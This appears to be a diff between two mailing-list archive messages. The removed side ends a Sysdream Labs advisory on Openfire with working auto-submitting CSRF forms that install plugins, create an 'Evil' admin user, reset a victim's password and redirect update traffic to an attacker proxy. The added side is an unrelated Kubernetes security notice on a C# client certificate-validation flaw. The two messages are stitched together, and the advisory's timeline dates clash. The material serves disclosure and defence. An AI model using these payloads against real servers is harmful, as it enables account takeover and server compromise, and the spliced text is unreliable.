-    <input type=3D"text" name=3D"c0-methodName" value=3D"installPlugin" >
-    <input type=3D"text" name=3D"c0-id" value=3D"9033_1444939787005" >
-    <input type=3D"text" name=3D"c0-param0" value=3D"string:http://www.igni=
-terealtime.org/projects/openfire/plugins/broadcast.jar" >
-    <input type=3D"text" name=3D"c0-param1" value=3D"string:8221154" >
-    <input type=3D"text" name=3D"xml" value=3D"true" >
-</form>
-
-<script>document.getElementById("csrf-form").submit()</script>
-```
-
-
-#### *client-connections-settings.jsp* is vulerable to a CSRF attack.
-
-The following HTML iframe command allows reproducing the attack against the=
- Openfire *client-connections-settings.jsp* page:
-
-```
-<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
-<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/client-connec=
-tions-settings.jsp" method=3D"post" target=3D"csrf-frame" >
-    <input type=3D"text" name=3D"port" value=3D"5222" >
-    <input type=3D"text" name=3D"sslEnabled" value=3D"false" >
-    <input type=3D"text" name=3D"sslPort" value=3D"5223" >
-    <input type=3D"text" name=3D"idleDisco" value=3D"true" >
-    <input type=3D"text" name=3D"clientIdle" value=3D"360" >
-    <input type=3D"text" name=3D"pingIdleClients" value=3D"true" >
-    <input type=3D"text" name=3D"update" value=3D"Save Settings" >
-</form>
-
-<script>document.getElementById("csrf-form").submit()</script>
-```
-
-#### *manage-updates.jsp* is vulerable to a CSRF attack.
-
-The following HTML iframe command allows reproducing the attack against the=
- *Openfire manage-updates.jsp* page:
-
-```
-<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
-<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/manage-update=
-s.jsp" method=3D"post" target=3D"csrf-frame" >
-    <input type=3D"text" name=3D"serviceEnabled" value=3D"false" >
-    <input type=3D"text" name=3D"notificationsEnabled" value=3D"false" >
-    <input type=3D"text" name=3D"proxyEnabled" value=3D"true" >
-    <input type=3D"text" name=3D"proxyHost" value=3D"10.0.0.1" >
-    <input type=3D"text" name=3D"proxyPort" value=3D"6666" >
-    <input type=3D"text" name=3D"update" value=3D"Save Settings" >
-</form>
-
-<script>document.getElementById("csrf-form").submit()</script>
-```
-
-#### *plugin-admin.jsp* is vulerable to a CSRF attack.
-
-The following HTML iframe command allows reproducing the attack against the=
- Openfire *plugin-admin.jsp* page.
-
-```
-<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
-<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/plugin-admin.=
-jsp" method=3D"get" target=3D"csrf-frame" >
-    <input type=3D"text" name=3D"deleteplugin" value=3D"broadcast" >
-</form>
-
-
-<script>document.getElementById("csrf-form").submit()</script>
-```
-
-The following HTML iframe command allows reproducing the attack against the=
- Openfire *reg-settings.jsp* page:
-
-```
-<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
-<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/reg-settings.=
-jsp" method=3D"get" target=3D"csrf-frame" >
-    <input type=3D"text" name=3D"inbandEnabled" value=3D"false" >
-    <input type=3D"text" name=3D"canChangePassword" value=3D"false" >
-    <input type=3D"text" name=3D"anonLogin" value=3D"fasle" >
-    <input type=3D"text" name=3D"allowedIPs" value=3D"0.0.0.0" >
-    <input type=3D"text" name=3D"allowedAnonymIPs" value=3D"0.0.0.0" >
-    <input type=3D"text" name=3D"save" value=3D"Save Settings" >
-</form>
-
-
-<script>document.getElementById("csrf-form").submit()</script>
-```
-
-#### *server-properties.jsp* is vulerable to a CSRF attack.
-
-The following HTML iframe command allows reproducing the attack against the=
- Openfire *server-properties.jsp* admin page.
-
-```
-<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
-<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/server-proper=
-ties.jsp" method=3D"post" target=3D"csrf-frame" >
-    <input type=3D"text" name=3D"propName" value=3D"test" >
-    <input type=3D"text" name=3D"propValue" value=3D"test" >
-    <input type=3D"text" name=3D"encrypt" value=3D""false >
-    <input type=3D"text" name=3D"save" value=3D"Save Property" >
-</form>
-
-<script>document.getElementById("csrf-form").submit()</script>
-```
-
-#### *system-email.jsp* is vulerable to a CSRF attack.
-
-The following HTML iframe command allows reproducing the attack against the=
- Openfire *system-email.jsp* admin page.
-
-```
-<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
-<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/system-email.=
-jsp" method=3D"post" target=3D"csrf-frame" >
-    <input type=3D"text" name=3D"host" value=3D"mail.google.com" >
-    <input type=3D"text" name=3D"port" value=3D"25" >
-    <input type=3D"text" name=3D"debug" value=3D"false" >
-    <input type=3D"text" name=3D"server_username" value=3D"toto" >
-    <input type=3D"text" name=3D"server_password" value=3D"toto" >
-    <input type=3D"text" name=3D"save" value=3D"Save Changes" >
-</form>
-```
-
-### Affected versions
-
-* Version >=3D 3.10.2 and < 4.0.0
-
-
-## Several CSRF Vulnerabilities identified in Openfire 3.10.2
-
-**Access Vector**: remote
-
-**Security Risk**: low
-
-**Vulnerability**: CWE-312
-
-**CVSS Base Score**: 5.4
-
-[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:=
-N/UI:R/S:U/C:L/I:L/A:N/E:F/RL:O
-
-### Vulnerability Description
-
-Several CSRF vulnerabilities have been found on different pages of the admi=
-n panel of the OpenFire web server. Through this attack, an attacker could =
-drive a valid user to execute unwittingly a request to the OpenFire sever.
-
-These vulnerabilities have already been found by hyp3rlinx, but had not bee=
-n patched yet.
-
-### Proof of Concept
-
-#### *connection-settings-external-components.jsp* is vulerable to a CSRF a=
-ttack.
-
-The following HTML iframe command allows reproducing the attack against the=
- Openfire *dwr/exec/downloader.installPlugin.dwr* page:
-
-```
-<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
-<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/user-create.j=
-sp" method=3D"get" target=3D"csrf-frame" >
-    <input type=3D"text" name=3D"name" value=3D"Evil" >
-    <input type=3D"text" name=3D"email" value=3D"evil@evil.f" >
-    <input type=3D"text" name=3D"password" value=3D"evil" >
-    <input type=3D"text" name=3D"passwordConfirm" value=3D"evil" >
-    <input type=3D"text" name=3D"create" value=3D"Create+User" >
-</form>
-
-<script>document.getElementById("csrf-form").submit()</script>
-```
-
-#### *client-connections-settings.jsp* is vulerable to a CSRF attack.
-
-The following HTML iframe command allows reproducing the attack against the=
- Openfire *client-connections-settings.jsp* page.
-
-```
-<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
-<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/user-password=
-.jsp" method=3D"post" target=3D"csrf-frame" >
-    <input type=3D"text" name=3D"username" value=3D"victim" >
-    <input type=3D"text" name=3D"password" value=3D"evil" >
-    <input type=3D"text" name=3D"passwordConfirm" value=3D"evil" >
-    <input type=3D"text" name=3D"update" value=3D"Update+Password" >
-</form>
-
-<script>document.getElementById("csrf-form").submit()</script>
-```
-
-### Affected versions
-
-* Version 4.0.0 and 4.0.1
-
-
-## Sensitive information disclosure in OpenFire Server <=3D3.10.2
-
-**Access Vector**: remote
-
-**Security Risk**: low
-
-**Vulnerability**: CWE-200
-
-**CVSS Base Score**: 5.5
-
-[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:=
-H/UI:N/S:U/C:H/I:L/A:N/E:F/RL:O
-
-### Vulnerability Description
-
-A sensitive information disclosure vulnerabilty is present in the page *sys=
-tem-email.jsp*. It allow's an authenticated user to retreive the md5 hash t=
-he password of an email account.
-
-### Vulnerable code
-
-The following HTML code is reveived by an authenticated user on the page sy=
-stem-email.jsp. The md5 hash of the password is sent to the user.
-
-```
-<tr>
-    <td nowrap>
-        Server Username (Optional):
-    </td>
-    <td nowrap>
-        <input type=3D"text" name=3D"server_username" value=3D"myusername" =
-size=3D"40" maxlength=3D"150">
-    </td>
-</tr>
-<tr>
-    <td nowrap>
-        Server Password (Optional):
-    </td>
-    <td nowrap>
-        <input type=3D"password" name=3D"server_password" value=3D"34819d7b=
-eeabb9260a5c854bc85b3e44" size=3D"40" maxlength=3D"150">
-    </td>
-</tr>
-```
-
-
-### Affected versions
-
-* Version >=3D3.10.2 and <4.0.2
-
-### Fixes
-
-* https://github.com/igniterealtime/Openfire/pull/570
-
-### Solution
-
-Update to version 4.0.2
-
-### Timeline (dd/mm/yyyy)
-
-* 15/10/2014 : Initial discovery
-* 19/10/2015 : Contact with vendor team
-* 27/11/2014 : vendor fixes vulnerabilities
-* 27/11/2014 : vendor releases version 4.0.2, which includes the fixes
-
-## Credits
-
-* Florian Nivette <f.nivette@sysdream.com>
-
-
-
-
---=20
-SYSDREAM Labs <labs@sysdream.com>
-
-GPG :
-47D1 E124 C43E F992 2A2E
-1551 8EB4 8CD9 D5B2 59A1
-
-* Website: https://sysdream.com/
-* Twitter: @sysdream
-
-
---oIbcGEmVxLTIHdqXvpeNMOUwUKrERQM6e
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v2
-
-iQIcBAEBCAAGBQJXe8JsAAoJEI60jNnVslmhduAQAKX/X77L5lY+sRRQkk7kKCft
-lR6NpE3RTkK3rFAZsJH2GlIFj/npfpiBEe9PQgwje//YAabRDrxygHmjnjzx2nyL
-o50eC7pxAhRiTMBtNN3wYyXHhm3Nj/AG42aSMMhFdm3h/ToPqmZXG87Ok2/EPc1W
-+ZU/bb0OeWkAcBfkQ8HqJl669XTI18uaTXWtmkzNq2m8CpwyRzd11ldezdSDUVUW
-yeOkeKFFzBTOxlxGE+LoVmc5BDZXAZQlTJM+tR4T2OwLrUvYNwGGfydpf7BBb82c
-eFHfEQkOI9Q7T3yVpSIobKgyxhOl6zasHImjz/PlF/W5ywN99jtkmlGbAxkddMi2
-lXKN3MFhl+lxbyPILUwFm1K70/ez4X34iCWc90ExxlhdNTw86t4b5uVjQYPPyRdr
-AqB7uM8dVMyT4AeTNeQuKexqtz28cCwLhReVJ6gEZLbsl0V3s6srociCUtkFH29m
-gWCkP4/aASAmuHQh7FZdN/q8FL9L4AdMNpZuGytqYCBKERGczcROf1hXsv6yAUTa
-Gre2Awlb0wmJXg6jn9A0tHdyEJJnFYuw6dNyl2MewtV4JT+oDcv10RzwXWn1Gxaa
-/VweGVfQQKW5eWz+eTvJYxlYAohOaiWDGLP+DxWcBtj4szWOjWdtNM4dtUjxKvMU
-eezkehBLlxFEiKgNeFNy
-=KfsD
------END PGP SIGNATURE-----
-
---oIbcGEmVxLTIHdqXvpeNMOUwUKrERQM6e--
+<div dir=3D"ltr"><div><br clear=3D"all"></div><div><span id=3D"gmail-docs-i=
+nternal-guid-c07288a1-7fff-dbfa-6d91-a13afeb41715"><p dir=3D"ltr" style=3D"=
+line-height:1.38;margin-top:0pt;margin-bottom:0pt"><span style=3D"font-size=
+:11pt;font-family:Arial,sans-serif;color:rgb(0,0,0);background-color:transp=
+arent;font-variant-numeric:normal;font-variant-east-asian:normal;font-varia=
+nt-alternates:normal;vertical-align:baseline">Hello Kubernetes Community,</=
+span></p><br><p dir=3D"ltr" style=3D"line-height:1.38;margin-top:0pt;margin=
+-bottom:0pt"><span style=3D"font-size:11pt;font-family:Arial,sans-serif;col=
+or:rgb(0,0,0);background-color:transparent;font-variant-numeric:normal;font=
+-variant-east-asian:normal;font-variant-alternates:normal;vertical-align:ba=
+seline">A vulnerability exists in the Kubernetes C# client where the certif=
+icate validation logic accepts properly constructed certificates from any C=
+ertificate Authority (CA) without properly verifying the trust chain. This =
+flaw allows a malicious actor to present a forged certificate and potential=
+ly intercept or manipulate communication with the Kubernetes API server, le=
+ading to possible man-in-the-middle attacks and API impersonation.</span></=
+p><br><p dir=3D"ltr" style=3D"line-height:1.38;margin-top:0pt;margin-bottom=
+:0pt"><span style=3D"font-size:11pt;font-family:Arial,sans-serif;color:rgb(=
+0,0,0);background-color:transparent;font-variant-numeric:normal;font-varian=
+t-east-asian:normal;font-variant-alternates:normal;vertical-align:baseline"=
+>This issue has been rated </span><span style=3D"font-size:11pt;font-family=
+:Arial,sans-serif;color:rgb(0,0,0);background-color:transparent;font-weight=
+:700;font-variant-numeric:normal;font-variant-east-asian:normal;font-varian=
+t-alternates:normal;vertical-align:baseline">Med (6.8)</span><span style=3D=
+"font-size:11pt;font-family:Arial,sans-serif;color:rgb(0,0,0);background-co=
+lor:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;=
+font-variant-alternates:normal;vertical-align:baseline"> </span><a href=3D"=
+https://www.first.org/cvss/calculator/3-1#CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/=
+C:H/I:H/A:N" style=3D"text-decoration-line:none"><span style=3D"font-size:1=
+1pt;font-family:Arial,sans-serif;background-color:transparent;font-variant-=
+numeric:normal;font-variant-east-asian:normal;font-variant-alternates:norma=
+l;text-decoration-line:underline;vertical-align:baseline">CVSS:3.1/AV:N/AC:=
+H/PR:N/UI:R/S:U/C:H/I:H/A:N</span></a><span style=3D"font-size:11pt;font-fa=
+mily:Arial,sans-serif;color:rgb(0,0,0);background-color:transparent;font-va=
+riant-numeric:normal;font-variant-east-asian:normal;font-variant-alternates=
+:normal;vertical-align:baseline">, and assigned </span><span style=3D"font-=
+size:11pt;font-family:Arial,sans-serif;color:rgb(0,0,0);background-color:tr=
+ansparent;font-weight:700;font-variant-numeric:normal;font-variant-east-asi=
+an:normal;font-variant-alternates:normal;vertical-align:baseline">CVE-2025-=
+9708</span><span style=3D"font-size:11pt;font-family:Arial,sans-serif;color=
+:rgb(0,0,0);background-color:transparent;font-variant-numeric:normal;font-v=
+ariant-east-asian:normal;font-variant-alternates:normal;vertical-align:base=
+line">.</span></p><br><p dir=3D"ltr" style=3D"line-height:1.38;margin-top:0=
+pt;margin-bottom:0pt"><span style=3D"font-size:11pt;font-family:Arial,sans-=
+serif;color:rgb(36,41,47);background-color:transparent;font-weight:700;font=
+-variant-numeric:normal;font-variant-east-asian:normal;font-variant-alterna=
+tes:normal;vertical-align:baseline">Am I vulnerable?</span></p><br><p dir=
+=3D"ltr" style=3D"line-height:1.38;margin-top:0pt;margin-bottom:0pt"><span =
+style=3D"font-size:11pt;font-family:Arial,sans-serif;color:rgb(36,41,47);ba=
+ckground-color:transparent;font-variant-numeric:normal;font-variant-east-as=
+ian:normal;font-variant-alternates:normal;vertical-align:baseline">You are =
+vulnerable if:</span></p><p dir=3D"ltr" style=3D"line-height:1.38;margin-to=
+p:0pt;margin-bottom:0pt"><span style=3D"font-size:11pt;font-family:Arial,sa=
+ns-serif;color:rgb(36,41,47);background-color:transparent;font-variant-nume=
+ric:normal;font-variant-east-asian:normal;font-variant-alternates:normal;ve=
+rtical-align:baseline">- You use the Kubernetes C# client to connect to a K=
+ubernetes API server over TLS/HTTPS=C2=A0 with custom CA certificates in yo=
+ur kubeconfig file and your connection occurs over an untrusted network.</s=
+pan></p><br><p dir=3D"ltr" style=3D"line-height:1.38;margin-top:0pt;margin-=
+bottom:0pt"><span style=3D"font-size:11pt;font-family:Arial,sans-serif;colo=
+r:rgb(36,41,47);background-color:transparent;font-weight:700;font-variant-n=
+umeric:normal;font-variant-east-asian:normal;font-variant-alternates:normal=
+;vertical-align:baseline">Affected Versions</span></p><ul style=3D"margin-t=
+op:0px;margin-bottom:0px"><li dir=3D"ltr" style=3D"list-style-type:disc;fon=
+t-size:11pt;font-family:Arial,sans-serif;color:rgb(0,0,0);background-color:=
+transparent;font-variant-numeric:normal;font-variant-east-asian:normal;font=
+-variant-alternates:normal;vertical-align:baseline;white-space:pre"><p dir=
+=3D"ltr" style=3D"line-height:1.38;margin-top:11pt;margin-bottom:11pt" role=
+=3D"presentation"><span style=3D"font-size:11pt;background-color:transparen=
+t;font-variant-numeric:normal;font-variant-east-asian:normal;font-variant-a=
+lternates:normal;vertical-align:baseline">All versions of the Kubernetes C#=
+ client prior to the next release &lt;=3D17.0.13</span></p></li></ul><p dir=
+=3D"ltr" style=3D"line-height:1.38;margin-top:0pt;margin-bottom:0pt"><span =
+style=3D"font-size:11pt;font-family:Arial,sans-serif;color:rgb(36,41,47);ba=
+ckground-color:transparent;font-weight:700;font-variant-numeric:normal;font=
+-variant-east-asian:normal;font-variant-alternates:normal;vertical-align:ba=
+seline">How do I mitigate this vulnerability?</span></p><br><p dir=3D"ltr" =
+style=3D"line-height:1.38;margin-top:0pt;margin-bottom:0pt"><span style=3D"=
+font-size:11pt;font-family:Arial,sans-serif;color:rgb(0,0,0);background-col=
+or:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;f=
+ont-variant-alternates:normal;vertical-align:baseline">This issue can be mi=
+tigated by:</span></p><br><ul style=3D"margin-top:0px;margin-bottom:0px"><l=
+i dir=3D"ltr" style=3D"list-style-type:disc;font-size:11pt;font-family:Aria=
+l,sans-serif;color:rgb(0,0,0);background-color:transparent;font-variant-num=
+eric:normal;font-variant-east-asian:normal;font-variant-alternates:normal;v=
+ertical-align:baseline;white-space:pre"><p dir=3D"ltr" style=3D"line-height=
+:1.38;margin-top:0pt;margin-bottom:0pt" role=3D"presentation"><span style=
+=3D"font-size:11pt;background-color:transparent;font-variant-numeric:normal=
+;font-variant-east-asian:normal;font-variant-alternates:normal;vertical-ali=
+gn:baseline">Deploy the patch version of the Kubernetes C# client as soon a=
+s possible.</span></p></li><li dir=3D"ltr" style=3D"list-style-type:disc;fo=
+nt-size:11pt;font-family:Arial,sans-serif;color:rgb(0,0,0);background-color=
+:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;fon=
+t-variant-alternates:normal;vertical-align:baseline;white-space:pre"><p dir=
+=3D"ltr" style=3D"line-height:1.38;margin-top:0pt;margin-bottom:0pt" role=
+=3D"presentation"><span style=3D"font-size:11pt;background-color:transparen=
+t;font-variant-numeric:normal;font-variant-east-asian:normal;font-variant-a=
+lternates:normal;vertical-align:baseline">Moving the CA certificates into t=
+he system trust store instead of specifying them in the kubeconfig file. No=
+te: This approach may introduce new risks, as all processes on the system w=
+ill begin to trust certificates signed by that CA. If you must use an affec=
+ted version, you can disable custom CA and add the CA to the machine&#39;s =
+trusted root.</span></p></li></ul><p dir=3D"ltr" style=3D"line-height:1.44;=
+margin-top:18pt;margin-bottom:12pt"><span style=3D"font-size:11pt;font-fami=
+ly:Arial,sans-serif;color:rgb(36,41,47);background-color:transparent;font-w=
+eight:700;font-variant-numeric:normal;font-variant-east-asian:normal;font-v=
+ariant-alternates:normal;vertical-align:baseline">Fixed Versions</span></p>=
+<ul style=3D"margin-top:0px;margin-bottom:0px"><li dir=3D"ltr" style=3D"lis=
+t-style-type:disc;font-size:11pt;font-family:Arial,sans-serif;color:rgb(0,0=
+,0);background-color:transparent;font-variant-numeric:normal;font-variant-e=
+ast-asian:normal;font-variant-alternates:normal;vertical-align:baseline;whi=
+te-space:pre"><p dir=3D"ltr" style=3D"line-height:1.38;margin-top:11pt;marg=
+in-bottom:11pt" role=3D"presentation"><span style=3D"font-size:11pt;backgro=
+und-color:transparent;font-variant-numeric:normal;font-variant-east-asian:n=
+ormal;font-variant-alternates:normal;vertical-align:baseline">Kubernetes C#=
+ client &gt;=3D v17.0.14</span></p></li></ul><p dir=3D"ltr" style=3D"line-h=
+eight:1.38;margin-top:0pt;margin-bottom:0pt"><span style=3D"font-size:11pt;=
+font-family:Arial,sans-serif;color:rgb(36,41,47);background-color:transpare=
+nt;font-weight:700;font-variant-numeric:normal;font-variant-east-asian:norm=
+al;font-variant-alternates:normal;vertical-align:baseline">Detection</span>=
+</p><p dir=3D"ltr" style=3D"line-height:1.38;margin-top:0pt;margin-bottom:0=
+pt"><span style=3D"font-size:11pt;font-family:Arial,sans-serif;color:rgb(0,=
+0,0);background-color:transparent;font-variant-numeric:normal;font-variant-=
+east-asian:normal;font-variant-alternates:normal;vertical-align:baseline"><=
+span class=3D"gmail-Apple-tab-span" style=3D"text-wrap-mode: nowrap;">	</sp=
+an></span></p><p dir=3D"ltr" style=3D"line-height:1.38;margin-top:0pt;margi=
+n-bottom:0pt"><span style=3D"font-size:11pt;font-family:Arial,sans-serif;co=
+lor:rgb(36,41,47);background-color:transparent;font-variant-numeric:normal;=
+font-variant-east-asian:normal;font-variant-alternates:normal;vertical-alig=
+n:baseline">To determine if your applications are affected:</span></p><ul s=
+tyle=3D"margin-top:0px;margin-bottom:0px"><li dir=3D"ltr" style=3D"list-sty=
+le-type:disc;font-size:11pt;font-family:Arial,sans-serif;color:rgb(36,41,47=
+);background-color:transparent;font-variant-numeric:normal;font-variant-eas=
+t-asian:normal;font-variant-alternates:normal;vertical-align:baseline;white=
+-space:pre"><p dir=3D"ltr" style=3D"line-height:1.38;margin-top:0pt;margin-=
+bottom:0pt" role=3D"presentation"><span style=3D"font-size:11pt;background-=
+color:transparent;font-variant-numeric:normal;font-variant-east-asian:norma=
+l;font-variant-alternates:normal;vertical-align:baseline">Review your usage=
+ of the Kubernetes C# client and inspect certificate validation logic.</spa=
+n></p></li><li dir=3D"ltr" style=3D"list-style-type:disc;font-size:11pt;fon=
+t-family:Arial,sans-serif;color:rgb(36,41,47);background-color:transparent;=
+font-variant-numeric:normal;font-variant-east-asian:normal;font-variant-alt=
+ernates:normal;vertical-align:baseline;white-space:pre"><p dir=3D"ltr" styl=
+e=3D"line-height:1.38;margin-top:0pt;margin-bottom:0pt" role=3D"presentatio=
+n"><span style=3D"font-size:11pt;background-color:transparent;font-variant-=
+numeric:normal;font-variant-east-asian:normal;font-variant-alternates:norma=
+l;vertical-align:baseline">Review your kubeconfig files and determine if yo=
+u use a custom CA certificate (the </span><span style=3D"font-size:11pt;fon=
+t-family:&quot;Roboto Mono&quot;,monospace;color:rgb(24,128,56);background-=
+color:transparent;font-variant-numeric:normal;font-variant-east-asian:norma=
+l;font-variant-alternates:normal;vertical-align:baseline">certificate-autho=
+rity</span><span style=3D"font-size:11pt;background-color:transparent;font-=
+variant-numeric:normal;font-variant-east-asian:normal;font-variant-alternat=
+es:normal;vertical-align:baseline"> field in the </span><span style=3D"font=
+-size:11pt;font-family:&quot;Roboto Mono&quot;,monospace;color:rgb(24,128,5=
+6);background-color:transparent;font-variant-numeric:normal;font-variant-ea=
+st-asian:normal;font-variant-alternates:normal;vertical-align:baseline">clu=
+sters</span><span style=3D"font-size:11pt;background-color:transparent;font=
+-variant-numeric:normal;font-variant-east-asian:normal;font-variant-alterna=
+tes:normal;vertical-align:baseline"> section).</span></p></li><li dir=3D"lt=
+r" style=3D"list-style-type:disc;font-size:11pt;font-family:Arial,sans-seri=
+f;color:rgb(36,41,47);background-color:transparent;font-variant-numeric:nor=
+mal;font-variant-east-asian:normal;font-variant-alternates:normal;vertical-=
+align:baseline;white-space:pre"><p dir=3D"ltr" style=3D"line-height:1.38;ma=
+rgin-top:0pt;margin-bottom:0pt" role=3D"presentation"><span style=3D"font-s=
+ize:11pt;background-color:transparent;font-variant-numeric:normal;font-vari=
+ant-east-asian:normal;font-variant-alternates:normal;vertical-align:baselin=
+e">Review client logs for unexpected or untrusted certificate connections.<=
+/span></p></li></ul><br><p dir=3D"ltr" style=3D"line-height:1.38;margin-top=
+:0pt;margin-bottom:0pt"><span style=3D"font-size:11pt;font-family:Arial,san=
+s-serif;color:rgb(0,0,0);background-color:transparent;font-variant-numeric:=
+normal;font-variant-east-asian:normal;font-variant-alternates:normal;vertic=
+al-align:baseline">If you find evidence that this vulnerability has been ex=
+ploited, please contact </span><a href=3D"mailto:security@kubernetes.io" st=
+yle=3D"text-decoration-line:none"><span style=3D"font-size:11pt;font-family=
+:Arial,sans-serif;background-color:transparent;font-variant-numeric:normal;=
+font-variant-east-asian:normal;font-variant-alternates:normal;text-decorati=
+on-line:underline;vertical-align:baseline">security@kubernetes.io</span></a=
+></p><br><p dir=3D"ltr" style=3D"line-height:1.38;margin-top:0pt;margin-bot=
+tom:0pt"><span style=3D"font-size:11pt;font-family:Arial,sans-serif;color:r=
+gb(0,0,0);background-color:transparent;font-variant-numeric:normal;font-var=
+iant-east-asian:normal;font-variant-alternates:normal;vertical-align:baseli=
+ne">Thank You,</span></p><br><p dir=3D"ltr" style=3D"line-height:1.38;margi=
+n-top:0pt;margin-bottom:0pt"><span style=3D"font-size:11pt;font-family:Aria=
+l,sans-serif;color:rgb(0,0,0);background-color:transparent;font-variant-num=
+eric:normal;font-variant-east-asian:normal;font-variant-alternates:normal;v=
+ertical-align:baseline">Rita Zhang on behalf of the Kubernetes Security Res=
+ponse Committee</span></p><p dir=3D"ltr" style=3D"line-height:1.44;margin-t=
+op:18pt;margin-bottom:12pt"><span style=3D"font-size:11pt;font-family:Arial=
+,sans-serif;color:rgb(36,41,47);background-color:transparent;font-weight:70=
+0;font-variant-numeric:normal;font-variant-east-asian:normal;font-variant-a=
+lternates:normal;vertical-align:baseline">Additional Details</span></p><p d=
+ir=3D"ltr" style=3D"line-height:1.38;margin-top:0pt;margin-bottom:0pt"><spa=
+n style=3D"font-size:11pt;font-family:Arial,sans-serif;color:rgb(36,41,47);=
+background-color:transparent;font-variant-numeric:normal;font-variant-east-=
+asian:normal;font-variant-alternates:normal;vertical-align:baseline">See th=
+e GitHub issue for more details: </span><a href=3D"https://github.com/kuber=
+netes/kubernetes/issues/134063" style=3D"text-decoration-line:none"><span s=
+tyle=3D"font-size:11pt;font-family:Arial,sans-serif;background-color:transp=
+arent;font-variant-numeric:normal;font-variant-east-asian:normal;font-varia=
+nt-alternates:normal;text-decoration-line:underline;vertical-align:baseline=
+">https://github.com/kubernetes/kubernetes/issues/134063</span></a><span st=
+yle=3D"font-size:11pt;font-family:Arial,sans-serif;color:rgb(36,41,47);back=
+ground-color:transparent;font-variant-numeric:normal;font-variant-east-asia=
+n:normal;font-variant-alternates:normal;vertical-align:baseline">=C2=A0</sp=
+an></p><br><p dir=3D"ltr" style=3D"line-height:1.38;margin-top:0pt;margin-b=
+ottom:0pt"><span style=3D"font-size:11pt;font-family:Arial,sans-serif;color=
+:rgb(0,0,0);background-color:transparent;font-weight:700;font-variant-numer=
+ic:normal;font-variant-east-asian:normal;font-variant-alternates:normal;ver=
+tical-align:baseline">Acknowledgements</span></p><br><p dir=3D"ltr" style=
+=3D"line-height:1.38;margin-top:0pt;margin-bottom:0pt"><span style=3D"font-=
+size:11pt;font-family:Arial,sans-serif;color:rgb(0,0,0);background-color:tr=
+ansparent;font-variant-numeric:normal;font-variant-east-asian:normal;font-v=
+ariant-alternates:normal;vertical-align:baseline">This vulnerability was re=
+ported by @elliott-beach</span></p><br><p dir=3D"ltr" style=3D"line-height:=
+1.38;margin-top:0pt;margin-bottom:0pt"><span style=3D"font-size:11pt;font-f=
+amily:Arial,sans-serif;color:rgb(0,0,0);background-color:transparent;font-v=
+ariant-numeric:normal;font-variant-east-asian:normal;font-variant-alternate=
+s:normal;vertical-align:baseline">The issue was fixed and coordinated by:=
+=C2=A0</span></p><br><p dir=3D"ltr" style=3D"line-height:1.38;margin-top:0p=
+t;margin-bottom:0pt"><span style=3D"font-size:11pt;font-family:Arial,sans-s=
+erif;color:rgb(0,0,0);background-color:transparent;font-variant-numeric:nor=
+mal;font-variant-east-asian:normal;font-variant-alternates:normal;vertical-=
+align:baseline">Boshi Lian @tg123</span></p><p dir=3D"ltr" style=3D"line-he=
+ight:1.38;margin-top:0pt;margin-bottom:0pt"><span style=3D"font-size:11pt;f=
+ont-family:Arial,sans-serif;color:rgb(0,0,0);background-color:transparent;f=
+ont-variant-numeric:normal;font-variant-east-asian:normal;font-variant-alte=
+rnates:normal;vertical-align:baseline">Brendan Burns @brendandburns</span><=
+/p><p dir=3D"ltr" style=3D"line-height:1.38;margin-top:0pt;margin-bottom:0p=
+t"><span style=3D"font-size:11pt;font-family:Arial,sans-serif;color:rgb(0,0=
+,0);background-color:transparent;font-variant-numeric:normal;font-variant-e=
+ast-asian:normal;font-variant-alternates:normal;vertical-align:baseline">Ri=
+ta Zhang @ritazh</span></p><br><p dir=3D"ltr" style=3D"line-height:1.38;mar=
+gin-top:0pt;margin-bottom:0pt"><span style=3D"font-size:11pt;font-family:Ar=
+ial,sans-serif;color:rgb(0,0,0);background-color:transparent;font-variant-n=
+umeric:normal;font-variant-east-asian:normal;font-variant-alternates:normal=
+;vertical-align:baseline">Thank You,</span></p><p dir=3D"ltr" style=3D"line=
+-height:1.38;margin-top:0pt;margin-bottom:0pt"><span style=3D"font-size:11p=
+t;font-family:Arial,sans-serif;color:rgb(0,0,0);background-color:transparen=
+t;font-variant-numeric:normal;font-variant-east-asian:normal;font-variant-a=
+lternates:normal;vertical-align:baseline">Rita Zhang on behalf of the Kuber=
+netes Security Response Committee</span></p></span></div><div dir=3D"ltr" c=
+lass=3D"gmail_signature" data-smartmail=3D"gmail_signature"><div dir=3D"ltr=
+"><div><br></div></div></div></div>
+
+--000000000000436cfa063eed3be3--
